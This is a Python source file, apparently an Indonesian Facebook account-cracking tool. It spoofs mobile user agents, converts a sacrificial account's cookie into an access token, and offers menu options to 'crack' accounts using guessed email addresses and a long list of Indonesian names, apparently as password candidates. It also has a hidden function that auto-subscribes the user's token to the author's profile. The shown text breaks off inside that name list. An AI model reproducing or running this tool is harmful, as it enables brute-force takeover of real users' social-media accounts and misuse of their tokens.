#----------[ IMPORT-MODULE ]----------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-RICH ]----------#	
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

#----------[ GLOBAL-NAMA-MU]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen = [],[]
loop, ok, cp = 0,0,0

#----------[ USER-CRACK ]--------#
for xd in range(10000):
	rr = random.randint
	rc = random.choice
	oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
	ugen1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,190))}.0.{str(rr(1999,5999))}.{str(rr(75,199))} Mobile Safari/537.36"
	ugen2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; SM-P610 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,190))}.0.{str(rr(1999,5999))}.{str(rr(75,199))} Safari/537.36"
	ugen3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(6,13))}; in-id; {str(rc(oppo))} Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,999))}.0.{str(rr(5500,5900))}.{str(rr(10,999))} Mobile Safari/537.36 HeyTapBrowser/{str(rr(10,50))}.{str(rr(6,30))}.{str(rr(1,10))}.{str(rr(1,10))}.{str(rr(1,10))}"
	zaxxy = random.choice([ugen1,ugen2,ugen3])
	ugen.append(zaxxy)
def url():
	rc = ["m.prod.facebook.com","m.facebook.com","free.prod.facebook.com","mbasic.facebook.com","graph.facebook.com"]
	hiu = "{str(rc(rc))}"
	return hiu
#--------[ GENERATE-USER-AGENT ]----------#
for generate in range(10):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])

#--------[ TAHUN-AKUN ]--------#    
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
	
def clear():
    os.system('clear')
###----------[ PEWARNA MAKANAN ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
biru = '\033[1;32m' 
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
asu = random.choice([m, k, h, u, b])
# ------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;96m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;92m' # WARNA-BIRU
ses=requests.Session()
#----------[ HAPUS ]----------#		
def ganti_cokies():
      try:os.remove(".zaxxycokies.txt")
      except:pass
      try:os.remove(".zaxxytoken.txt")
      except:pass
      login3()
      	
#----------[ BANNER ]----------#
def banner():
	print(f'SCRIPT: {hijo}FREE{puti}')
	print(f'OWNER : {hijo}ZAXXYDEV{puti}')
	print(f'Crete Tool By : {hijo}ZAXXYDEV{puti}')                                                  
#kukis
def login3():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()


def login_lagi334():
	try:
		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		cookie=input(f'  [{h}•{x}]Koki :{asu} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('%sLogin Succes%s'%(h, p))

				else:
					print('%sFailled Get Token%s'%(m, p))

			except:
				print('Failled Get Token')

		print(f'  {x}[{h}•{x}]{h} Berhasil Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#----------[ BAGIAN-MENU ]----------#            
def menu():
	clear();banner()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P} [:] cookies kamu invalid.{P}')
		time.sleep(2);os.system('clear')
		login3()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [:] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		print(f"\n{P} [:] sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		os.system('clear')
		login3()
		banner()
	print("1.CRACK GMAIL")
	print("2.HASIL OK")
	print("3.HASIL CP")
	print("4.CRACK FILE")
	ZAXXY_KECHE = input(f'{biru}──>{puti} INPUT NOMOR : ')
	if ZAXXY_KECHE in ['01','1']:
		mail2()
	if ZAXXY_KECHE in ['02','2']:
		hasil_ok()
	elif ZAXXY_KECHE in ['03','3']:
		asil_cp()
	elif ZAXXY_KECHE in ['04','4']:
		crackfile()
#-------Name Gmail---------#
def mail2():
	dump=[]
	rc = random.choice
	rr = random.randint
	tengah = ['irawan','wirawan','wijaya','wijayanto','ramdani','ramadan','ramadhani','ramadhan','gunawan','pratama','peratama','purnama','gunawan','hermawan','hermansyah','hermanto','kurniawan','kurnia','purnomo','sutomo','supomo','suparman','suherman','darmawan','dermawan','nugraha','saputra','syahputra','setiawan','darman','nugroho','setyawan','ardiansyah','ardiansah','ardiana','firmansyah','firmansah','dirgantara','sinaga','nasution','salmanan','lesmana','saepuloh','ferdiansah','hidayat','saepudin','saripudin','maulana','supriadi','supardi','khan','rahayu','aprilia','apriliani','fitriani','damayanti','wulandari','pratiwi','anatasya','kartika','kartini','rahmawati','pertiwi','azizah','aisyah','fatimah','handayani','nurahma','nuraisyah','nuarazizah','nursakila','nurfatimah','adinda','risawati','sulastri','mulyani','mulyati','wahyuni','sumiati','rusmiati','yulianti','yuliani','julianti','yulianto','julianto','ananda','safira','aminah','hasanah','ferawati','sumarni','anggraena','anggraeni','maharani','salsabila','sabila','evve','lestari','hungkul','nurcahaya','nurjanah','nuraminah','fatmawati','sukaesih','septiani','ningsih','nengsih','yuningsih','yunengsih','suningsih,sunengsih','nursuci','khoerunisa','ekaputri','abiyah', 'abdilla', 'aca', 'acha', 'acaa', 'achaa', 'ai', 'aii', 'adawiah', 'adawiyah', 'ade', 'adel', 'adell', 'adel', 'adellaa', 'adelia', 'adellia', 'adeliya', 'adiba', 'adifa', 'adinda', 'aeni', 'aidah', 'aini', 'ainun', 'aira', 'asiah', 'aisah', 'aisyah', 'afifah', 'afipah', 'alawiah', 'alawiyah', 'alfatunisa', 'alfatunnisa', 'agnes', 'agnesia', 'ajahra', 'ajeng', 'ajeung', 'ajig', 'ajijah', 'ajizah', 'ajg', 'alesha', 'alia', 'alika', 'alimah', 'aliya', 'alifa', 'alifah', 'aliva', 'alivah', 'aliyah', 'almeera', 'almira', 'ama', 'amalia', 'amaliag', 'amaliyah', 'amanda', 'amidah', 'amira', 'aminah', 'ana', 'anantasia', 'anantasya', 'anastasia', 'anastasya', 'agnes', 'andini', 'ani', 'anisa', 'anita', 'any', 'anying', 'anyun', 'angela', 'angelina', 'anggraeni', 'anggraini', 'anggi', 'anggita', 'anggun', 'anjas', 'anjasmara', 'anjay', 'anugerah', 'anugrah', 'anjing', 'apifah', 'apipah', 'april', 'aprilia', 'aprillia', 'apriliani', 'apriliyani', 'aprilianti', 'apriliyanti', 'aqila', 'aqilla', 'ara', 'arra', 'arafah', 'arrafah', 'areta', 'aretha', 'arofah', 'arin', 'arini', 'ariani', 'arista', 'ariyani', 'aryani', 'aryanti', 'arianti', 'ariyanti', 'arumi', 'arsita', 'arsyita', 'arsila', 'asyila', 'asypa', 'asifa', 'asipa', 'asmi', 'asmara', 'asih', 'asilah', 'asti', 'astiani', 'astiyani', 'astuti', 'atik', 'atika', 'atikah', 'ayg', 'ayank', 'ayang', 'ayra', 'ayu', 'ayyu', 'ayunda', 'ayuni', 'ayudia', 'ayudiya', 'ayudiah', 'ayuningsih', 'azzahra', 'azijah', 'azizah', 'azmi', 'azmy', 'azura','babi', 'baby', 'badriah', 'bajingan', 'bagong', 'bandung', 'bngst', 'bangsat', 'bela', 'bella', 'bibah', 'bila', 'billa', 'belinda', 'betharia', 'bintang', 'briana', 'britania', 'briela', 'briyana', 'budiarti', 'bulan', 'bunga', 'bungsu', 'bunyamin', 'butet','ca', 'cabi', 'cabhy', 'caby', 'cabby', 'caca', 'cca', 'cahaya', 'cahya', 'cahyani', 'cahyaningsih', 'caitlyn', 'camelia', 'cangcut', 'can', 'cans', 'canss', 'cantik', 'cantika', 'caroline', 'charrisa', 'catherine', 'cassandra', 'celine', 'cecilia', 'celsi', 'celsie', 'centil', 'chaca', 'chacha', 'chelsi', 'chelsie', 'chelsea', 'chesi', 'chessy', 'chika', 'cia', 'cci', 'cici', 'cika', 'cimok', 'cindy', 'cinta', 'cintia', 'cintaku', 'cintya', 'cintiya', 'citra', 'chindy', 'claudya', 'cucu', 'ccu', 'culun', 'cupu', 'cynthia', 'cyntia','dafin', 'dahlia', 'daiba', 'dania', 'daniah', 'daniyah', 'danyyah', 'daswita', 'dara', 'davina', 'darsie', 'dawy', 'de', 'dea', 'dede', 'dela', 'della', 'delia', 'delicia', 'denia', 'deniah', 'deniyah', 'deon', 'debi', 'deby', 'debby', 'denita', 'denisa', 'devi', 'devia', 'devie', 'desnia', 'desnie', 'divita', 'desi', 'desita', 'deswita', 'dewandana', 'dwi', 'dewi', 'dewita', 'dhairya', 'dhara', 'dhe', 'dhea', 'dheniah', 'dhewi', 'dhita', 'dhiya', 'dia', 'diah', 'diajeng', 'dian', 'diana', 'diandra', 'diannova', 'dias', 'diinah', 'dika', 'diksa', 'dila', 'dilla', 'dipa', 'diva', 'dianda', 'dila', 'dilla', 'dira', 'dina', 'dinda', 'dini', 'diniah', 'diniyah', 'disa', 'disha', 'dita', 'divya', 'dixha', 'diya', 'diyah', 'diyara', 'dnya', 'dona', 'dyra', 'dyah', 'dzafina', 'djakarta','eka', 'elailah', 'elaina', 'eira', 'eisha', 'elaina', 'elda', 'elea', 'elena', 'eleanor', 'eleanoer', 'eleha', 'eletha', 'elfie', 'elga', 'elia', 'eliana', 'elicia', 'elika', 'elin', 'elina', 'elisabeth', 'elis', 'ellis', 'elise', 'eliya', 'eliza', 'elizabeth', 'ella', 'ellen', 'elliana', 'ellie', 'elma', 'elmira', 'elora', 'elisa', 'elisha', 'elisia', 'elisiya', 'elisya', 'elisyha', 'elsye', 'elfina', 'elsa', 'evi', 'epi', 'elisabeth', 'elin', 'elsy', 'elva', 'elvira', 'elly' 'elvina', 'elzahra', 'embun', 'emeline', 'ekavira', 'emery', 'emi', 'emilia', 'emy', 'emyliya', 'ema', 'emma', 'emily', 'emira', 'endah', 'endang', 'epi', 'erna', 'erni', 'eri', 'erika', 'erina', 'erlinda', 'esti', 'estiana', 'eis', 'eti', 'etie', 'ety', 'euis', 'eva', 'evi', 'evita', 'evitamala', 'evalina', 'evelyn', 'ewe','fara', 'farah', 'farrah', 'fadila', 'fadla', 'fadhila', 'fadhla', 'faija', 'faiza', 'faizza', 'faizah', 'fani', 'fanni', 'fany', 'fanny', 'fanya', 'farhah', 'farhana', 'farida', 'faridha', 'fasya', 'fasha', 'fathia', 'fatin', 'fatina', 'fatthyyah', 'faujia', 'faujiah', 'fauzia', 'fauziah', 'fauziya', 'fauzyah', 'fawziyah', 'fazila', 'fazilla', 'fazeela', 'fatim', 'fatima', 'fatimah', 'fathimah', 'felisia', 'felisya', 'ferli', 'ferly', 'ferlyani', 'fika', 'fina', 'fiona', 'fionna', 'fida', 'fira', 'firli', 'firly', 'firlly', 'firliani', 'firliyani', 'fita', 'fitri', 'fitriani', 'fitriyani', 'fitryani', 'fiska', 'fizka', 'fiza', 'frisilia', 'frisiliya', 'freya', 'friska', 'fuji', 'fuzi','gabriella', 'gaby', 'gabby', 'garut', 'gadis', 'geby', 'gebby', 'gelsey', 'gendis', 'gemma', 'georgia', 'gloria', 'gea', 'ghwa', 'gia', 'ghia', 'ghina', 'ghita"', 'gina', 'ginna', 'gisela', 'gisella', 'gita', 'gitta', 'grace', 'gracia','grachelyn','gracheline', 'graciella', 'greta', 'gresia', 'gresik', 'glenda', 'gloria', 'giska', 'greta', 'ganesha', 'geisha', 'genta', 'gwendolyn','habibah', 'harika', 'hafsa', 'halima', 'halia', 'halimah', 'hafiza', 'hafsah', 'hafiza', 'hafizah', 'hana', 'handayani', 'handayanti', 'hanna', 'hannah', 'hani', 'hany', 'hanny', 'hanifah', 'hanipah', 'haila', 'hayla', 'hania', 'haniya', 'hartini', 'hasanah', 'hatima', 'hatimah', 'hilda', 'hilma', 'hilmawati', 'hiya', 'helen', 'helena', 'hellen', 'helia', 'helin', 'helina', 'hemalia', 'hepti', 'hesa', 'hessa', 'hesha', 'hesti', 'hestia', 'hesty', 'helga', 'hasna', 'hinata', 'hikmat', 'hopi', 'hopipah', 'hoho', 'hotima', 'hotimah', 'hikmah', 'humaida', 'humayda', 'husna', 'hurairah','ica', 'icaa', 'icha', 'ichaa', 'ida', 'ifa', 'iffa', 'ilmira', 'ina', 'inna', 'inaara', 'inara', 'inarah', 'inayah', 'indah', 'indira', 'indyra', 'indri', 'indry', 'insan', 'insani', 'imelda', 'ina', 'irma', 'irena', 'ika', 'ijah', 'intan', 'intanrahayu', 'ira', 'isabela', 'isabella', 'isan', 'isana', 'isyana', 'isah', 'isma', 'ismawati', 'ismawaty', 'ismi', 'ismiya', 'ismiyati', 'isnaen', 'isnaeni', 'isni', 'iza', 'izah', 'izna', 'iysha','jafira', 'jahira', 'jalilah', 'jahra', 'jamilah', 'janeta', 'jameela', 'jannah', 'janita', 'jasmin', 'jasmine', 'jayanti', 'jelita', 'jeni', 'jeny', 'jenny', 'jennifer', 'jenita', 'jennita', 'jesica', 'jesicca', 'jesika', 'jihan', 'jihana', 'jingga', 'juwita', 'juli', 'julia', 'juliana', 'juliet', 'jumaina', 'jumainah', 'juniarti', 'junaina', 'juwitta', 'jwita','kaila', 'kalia', 'kaira', 'khaira', 'karin', 'karina', 'kartika', 'kadek', 'kania', 'kaniya', 'kartini', 'kasih', 'kamala', 'kamila', 'karima', 'karomah', 'karisa', 'karissa', 'karsih', 'katrina', 'keira', 'khaira', 'khaila', 'khafifah', 'khadijah', 'khairun', 'khairunisa', 'khalifah', 'khalilah', 'khabirah', 'khatimah', 'khofiroh', 'khopipah', 'kiki', 'kim', 'kiara', 'kila', 'killa', 'kira', 'kirani', 'komarudin', 'kumala', 'kumalasari', 'kokom', 'komala', 'komalasari', 'komalawati', 'kontol', 'kotima', 'kotimah', 'kulsum', 'kultsum', 'kuntul', 'kurnia', 'kurniati', 'kurniyati', 'kursina', 'kurniasih', 'kusina', 'kusmiati', 'kusmiyai','laela', 'laesa', 'lady', 'lafiza', 'lala', 'laila', 'lati', 'laty', 'latifah', 'lathifah', 'layla', 'lara', 'laras', 'larasati', 'lasmini', 'laura', 'laudia', 'laudya', 'leila', 'lela', 'lesmana', 'lesmana', 'lena', 'leni', 'lenka', 'leny', 'lenny', 'lestari', 'lestarty', 'lesti', 'lesty', 'levita', 'lia', 'lida', 'lidia', 'lidya', 'liana', 'liani', 'lilis', 'lina', 'linda', 'lintang', 'lis', 'lisa', 'lisha', 'lisna', 'lisnawati', 'lisnawaty', 'listi', 'listy', 'listia', 'listya', 'liza', 'liya', 'liyani', 'liza', 'lomrah', 'lola', 'lolita', 'luci', 'lucia', 'lucy', 'lucya', 'lulu', 'luna', 'lusi', 'lusy', 'luvita', 'lyan', 'lyna', 'lysa','mae', 'maemunah', 'maesarah', 'maesaroh', 'mala', 'maida', 'maidah', 'maira', 'maisa', 'maisha', 'malika', 'maimunah', 'magfirah', 'mahalini', 'maharani', 'maharini', 'mahda', 'manda', 'mandha', 'maria', 'mardiah', 'mardianti', 'mardiyanti', 'mardyah', 'mardiyah', 'mariah', 'mariam', 'mariyah', 'maryati', 'mariati', 'mariyati', 'markonah', 'mariyam', 'marisa', 'marissa', 'martina', 'martinah', 'martini', 'maryamah', 'marwah', 'maryanti', 'marwati',  'marwaty', 'marzia', 'marziya', 'masitoh', 'masriah', 'masriyah', 'maulida', 'maulidia', 'maulidya', 'maulidiya', 'mawar', 'maya', 'mayra', 'maymuna', 'maymunah', 'marziah', 'meca', 'mecca', 'meka', 'medina', 'mega', 'megan', 'melani', 'melany', 'melina', 'meli', 'melinda', 'melisa', 'melly', 'merry', 'mia', 'mieta', 'mietaa', 'mila', 'mimin', 'mira', 'miraa', 'mirna', 'miranda', 'miya', 'mufliha', 'muna', 'munawarah', 'munawwarah', 'munawaroh', 'murni', 'murniati', 'murniyati', 'muslima', 'mulimah', 'muti', 'mutmainah', 'muthmainnah', 'mutmaidah', 'muthmaidah', 'mutia', 'mutiara','nabila', 'nada', 'nadhin', 'nadia', 'nadira', 'nadhira', 'nadin', 'nadiya', 'nafisa', 'nafisha', 'nafisah', 'nagita', 'naila', 'naira', 'najwa', 'nana', 'nanda', 'nani', 'natalia', 'nataliya', 'natasia', 'natasya', 'natasyha', 'nasa', 'naura', 'nayara', 'nayyara', 'nayra', 'nayla', 'naswa', 'nashwa', 'nasywa', 'nazwa', 'nia', 'nida', 'nifa', 'nina', 'nindi', 'nindy', 'ningrum', 'ningsih', 'nita', 'nitatalia', 'niken', 'nisa', 'nissa', 'nurul', 'nopi', 'novi', 'novita', 'nurull', 'nunung', 'nuri', 'nurianti', 'nurjanah', 'nurjannah', 'nuryanti','oca', 'octa', 'octavia', 'olivia', 'ollivia', 'oliv', 'olive', 'olla', 'okta', 'oktavia', 'ocha', 'odie', 'omaira', 'ogut', 'xabiya', 'xaviera', 'xavira', 'xena', 'xiao', 'xyla','padma', 'putri', 'puspa', 'pipit', 'prita', 'paras', 'paramita' 'permata','permatasari', 'purnama', 'purnamasari', 'puspa','putri', 'puteri', 'pitri', 'pratiwi', 'pramita', 'priyanka','qaidah', 'qaila', 'qailla', 'qanita', 'qasidah', 'qasimah', 'qiana', 'qiani', 'qila', 'qilla', 'qiqi', 'qonita', 'qori', 'qoriah', 'qoriyah', 'qosamah', 'qosimah', 'qalesya','ra', 'raa', 'raina', 'rana', 'rabiah', 'rabiyah', 'rafa', 'raisa', 'raiqah', 'raimah', 'rahma', 'rahmah', 'rahmaa', 'rahmawati', 'rahmawaty', 'rhma', 'rahnadani', 'rahmadhani', 'ramadani', 'ramadhani', 'rani', 'rany', 'raniah', 'rasya', 'rati', 'ratifah', 'rara', 'rere', 'refa', 'repa', 'reva', 'repani', 'revani', 'rena', 'renatri', 'reni', 'renata', 'rani', 'ratna', 'raya', 'rina', 'rida', 'rifda', 'rifdah', 'rini', 'ririn', 'rianti', 'rianty', 'riyanti', 'riyanty', 'riska', 'rizka', 'rohma', 'rohmah', 'rohmawati', 'rohmawaty', 'rona', 'rosdiana', 'rosdiani', 'ross', 'rossa', 